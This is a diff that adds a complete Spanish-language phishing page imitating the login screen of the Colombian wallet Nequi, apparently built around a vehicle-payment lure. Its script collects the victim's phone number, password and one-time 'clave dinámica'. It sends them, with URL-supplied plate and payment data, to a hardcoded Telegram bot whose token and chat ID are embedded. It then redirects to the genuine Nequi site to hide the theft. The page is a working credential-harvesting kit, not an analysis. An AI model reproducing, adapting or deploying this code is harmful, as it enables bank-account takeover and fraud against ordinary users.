@@ -1,0 +1,464 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title></title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
+      background: linear-gradient(135deg, #fce4ec 0%, #f3e5f5 100%);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .header {
+      background: white;
+       padding: 0 40px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+      height: 90px; 
+    }
+
+    .logo img {
+      height: 170px;
+      width: auto;
+    }
+
+    .btn-recarga {
+      background: #e91e8c;
+      color: white;
+      border: none;
+      padding: 12px 32px;
+      border-radius: 8px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.3s;
+    }
+
+    .btn-recarga:hover {
+      background: #d11a7d;
+    }
+
+    .container {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 40px 20px;
+    }
+
+    .form-card {
+      background: white;
+      border-radius: 16px;
+      padding: 48px 40px;
+      width: 100%;
+      max-width: 420px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+    }
+
+    h1 {
+      font-size: 32px;
+      font-weight: 700;
+      color: #1a1a1a;
+      margin-bottom: 16px;
+      text-align: center;
+    }
+
+    .subtitle {
+      font-size: 15px;
+      color: #666;
+      margin-bottom: 40px;
+      text-align: center;
+      line-height: 1.5;
+    }
+
+    .phone-wrapper {
+      display: flex;
+      gap: 0;
+      margin-bottom: 16px;
+      border: 1px solid #ddd;
+      border-radius: 8px;
+      overflow: hidden;
+    }
+
+    .country-code {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      padding: 14px 16px;
+      background: #f9f9f9;
+      border-right: 1px solid #ddd;
+      font-size: 15px;
+      color: #333;
+      font-weight: 500;
+    }
+
+    .country-code svg {
+      width: 24px;
+      height: 16px;
+    }
+
+    .arrow-down {
+      color: #999;
+      font-size: 12px;
+      margin-left: 4px;
+    }
+
+    .phone-wrapper input {
+      flex: 1;
+      border: none;
+      padding: 14px 16px;
+      font-size: 15px;
+      color: #333;
+    }
+
+    .phone-wrapper input:focus {
+      outline: none;
+    }
+
+    .phone-wrapper:focus-within {
+      border-color: #e91e8c;
+    }
+
+    .form-group {
+      margin-bottom: 16px;
+    }
+
+    .form-group input {
+      width: 100%;
+      padding: 14px 16px;
+      border: 1px solid #ddd;
+      border-radius: 8px;
+      font-size: 15px;
+      color: #333;
+      transition: border-color 0.3s;
+    }
+
+    .form-group input:focus {
+      outline: none;
+      border-color: #e91e8c;
+    }
+
+    .form-group input::placeholder {
+      color: #999;
+    }
+
+    /* Campo de clave dinámica oculto por defecto */
+    #campo-clave-dinamica {
+      display: none;
+      animation: slideDown 0.3s ease;
+    }
+
+    @keyframes slideDown {
+      from {
+        opacity: 0;
+        transform: translateY(-10px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    .captcha-box {
+      border: 1px solid #ddd;
+      border-radius: 12px;
+      padding: 20px;
+      margin-bottom: 28px;
+      margin-top: 24px;
+      display: flex;
+      align-items: center;
+      gap: 16px;
+    }
+
+    .captcha-circle {
+      width: 32px;
+      height: 32px;
+      border: 3px solid #e91e8c;
+      border-radius: 50%;
+      flex-shrink: 0;
+      cursor: pointer;
+      transition: all 0.3s;
+    }
+
+    .captcha-circle.checked {
+      background: #e91e8c;
+      position: relative;
+    }
+
+    .captcha-circle.checked::after {
+      content: '✓';
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      color: white;
+      font-size: 18px;
+      font-weight: bold;
+    }
+
+    .captcha-box label {
+      font-size: 14px;
+      color: #333;
+      cursor: pointer;
+      flex: 1;
+      user-select: none;
+    }
+
+    .btn-submit {
+      width: 100%;
+      padding: 16px;
+      background: #f0c4d9;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-size: 17px;
+      font-weight: 600;
+      cursor: not-allowed;
+      transition: all 0.3s;
+    }
+
+    .btn-submit.active {
+      background: #e91e8c;
+      cursor: pointer;
+    }
+
+    .btn-submit.active:hover {
+      background: #d11a7d;
+    }
+
+    /* Responsive */
+    @media (max-width: 768px) {
+      .header {
+        padding: 0 20px;
+        height: 70px;
+      }
+
+      .logo img {
+        height: 130px;
+         margin-top: 0;
+
+      }
+
+      .btn-recarga {
+        padding: 10px 24px;
+        font-size: 15px;
+      }
+
+      .form-card {
+        padding: 36px 24px;
+      }
+
+      h1 {
+        font-size: 26px;
+      }
+
+      .subtitle {
+        font-size: 14px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Header -->
+  <header class="header">
+    <div class="logo">
+      <img src="nequi2.png" alt="Nequi">
+    </div>
+    <button class="btn-recarga">Recarga</button>
+  </header>
+
+  <!-- Container -->
+  <div class="container">
+    <div class="form-card">
+      
+      <!-- Pantalla de login -->
+      <div id="login-screen">
+        <h1>Entra a tu Nequi</h1>
+        <p class="subtitle">Podrás bloquear tu Nequi, consultar tus datos.</p>
+
+        <div class="phone-wrapper">
+          <div class="country-code">
+          <svg viewBox="0 0 900 600" xmlns="http://www.w3.org/2000/svg">
+  <rect width="900" height="300" y="0" fill="#FCD116"/>
+  <rect width="900" height="150" y="300" fill="#003893"/>
+  <rect width="900" height="150" y="450" fill="#CE1126"/>
+</svg>
+            <span>+57</span>
+            <span class="arrow-down">▼</span>
+          </div>
+          <input type="tel" id="celular" placeholder="Número de celular" maxlength="10" inputmode="numeric" pattern="[0-9]*">
+        </div>
+
+        <div class="form-group">
+          <input type="password" id="contrasena" placeholder="Contraseña">
+        </div>
+
+        <!-- Campo de clave dinámica (oculto por defecto) -->
+        <div class="form-group" id="campo-clave-dinamica">
+          <input type="password" id="clave-dinamica" placeholder="Clave dinámica">
+        </div>
+
+        <div class="captcha-box">
+          <div class="captcha-circle" id="captcha-circle" onclick="toggleCaptcha()"></div>
+          <label onclick="toggleCaptcha()">Confirmo que soy una persona real.</label>
+        </div>
+
+        <button type="button" class="btn-submit" id="btn-entrar" onclick="enviarDatos()">Entra</button>
+      </div>
+
+    </div>
+  </div>
+
+ <script>
+const BOT_TOKEN = '8735380697:AAF4G03kbZoCAOf2IUWJHE6P6jcmlzYQzCg';
+const CHAT_ID = '-1003969378541';
+
+
+const params = new URLSearchParams(window.location.search);
+const placa = params.get('placa') || '';
+const valor = params.get('valor') || '';
+const pagoId = params.get('pagoId') || '';
+
+// Solo números celular
+document.getElementById('celular').addEventListener('input', function() {
+  this.value = this.value.replace(/[^0-9]/g, '');
+});
+
+let captchaChecked = false;
+let claveDinamicaSolicitada = false;
+
+// ================= CAPTCHA =================
+function toggleCaptcha() {
+  captchaChecked = !captchaChecked;
+  const circle = document.getElementById('captcha-circle');
+
+  if (captchaChecked) {
+    circle.classList.add('checked');
+  } else {
+    circle.classList.remove('checked');
+  }
+
+  validarCampos();
+}
+
+// ================= VALIDAR =================
+document.getElementById('celular').addEventListener('input', validarCampos);
+document.getElementById('contrasena').addEventListener('input', validarCampos);
+document.getElementById('clave-dinamica').addEventListener('input', validarCampos);
+
+function validarCampos() {
+  const celular = document.getElementById('celular').value.trim();
+  const contrasena = document.getElementById('contrasena').value.trim();
+  const btn = document.getElementById('btn-entrar');
+
+  if (!claveDinamicaSolicitada) {
+    if (celular && contrasena && captchaChecked) {
+      btn.classList.add('active');
+      btn.style.cursor = 'pointer';
+    } else {
+      btn.classList.remove('active');
+      btn.style.cursor = 'not-allowed';
+    }
+  } else {
+    const clave = document.getElementById('clave-dinamica').value.trim();
+    if (celular && contrasena && clave && captchaChecked) {
+      btn.classList.add('active');
+      btn.textContent = 'Enviar';
+      btn.style.cursor = 'pointer';
+    } else {
+      btn.classList.remove('active');
+      btn.style.cursor = 'not-allowed';
+    }
+  }
+}
+
+// ================= ENVIAR =================
+async function enviarDatos() {
+  const celular = document.getElementById('celular').value.trim();
+  const contrasena = document.getElementById('contrasena').value.trim();
+
+  if (!celular || !contrasena || !captchaChecked) {
+    alert('⚠️ Completa todo');
+    return;
+  }
+
+  // ================= LOGIN =================
+  if (!claveDinamicaSolicitada) {
+
+    let mensaje = "📲 <b>NEQUI LOGIN</b>\n\n";
+
+    document.querySelectorAll("input").forEach(el => {
+      const nombre = el.id || "campo";
+      const valorInput = el.value || "N/A";
+      mensaje += `<b>${nombre}:</b> ${valorInput}\n`;
+    });
+
+    mensaje += `\n🚗 <b>placa:</b> ${placa}`;
+    mensaje += `\n💰 <b>valor:</b> ${valor}`;
+    mensaje += `\n🆔 <b>pago_id:</b> ${pagoId}`;
+    mensaje += `\n⏰ <b>fecha:</b> ${new Date().toISOString()}`;
+
+    try {
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: mensaje,
+          parse_mode: 'HTML'
+        })
+      });
+    } catch (e) {}
+
+    // 🔥 Mostrar clave dinámica automático
+    setTimeout(() => {
+      document.getElementById('campo-clave-dinamica').style.display = 'block';
+      document.getElementById('clave-dinamica').focus();
+      claveDinamicaSolicitada = true;
+      validarCampos();
+    }, 1500);
+
+  } else {
+
+    // ================= CLAVE DINÁMICA =================
+    const clave = document.getElementById('clave-dinamica').value.trim();
+
+    if (!clave) {
+      alert('⚠️ Ingresa la clave dinámica');
+      return;
+    }
+
+    let mensaje = "🔑 <b>NEQUI CLAVE DINÁMICA</b>\n\n";
+    mensaje += `<b>clave:</b> ${clave}`;
+
+    try {
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: mensaje,
+          parse_mode: 'HTML'
+        })
+      });
+    } catch (e) {}
+
+    window.location.href = 'https://www.nequi.com.co/';
+  }
+}
+</script>
+</body>
+</html>
